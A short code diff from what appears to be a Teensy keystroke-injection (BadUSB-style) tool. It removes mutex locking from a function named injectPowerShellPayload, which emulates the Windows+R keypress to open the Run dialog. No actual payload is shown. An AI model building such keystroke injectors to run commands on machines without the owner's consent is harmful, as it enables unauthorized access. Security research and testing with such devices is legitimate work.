@@ -1,13 +1,9 @@
 #include <Arduino.h>
-#include <TeensyThreads.h>
 #include <usb_keyboard.h>
 
-#include "UsbKeyboardMutex.h"
 #include "injector.h"
 
 void injectPowerShellPayload() {
-    Threads::Scope lock(usbKeyboardMutex());
-
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
     Keyboard.releaseAll();
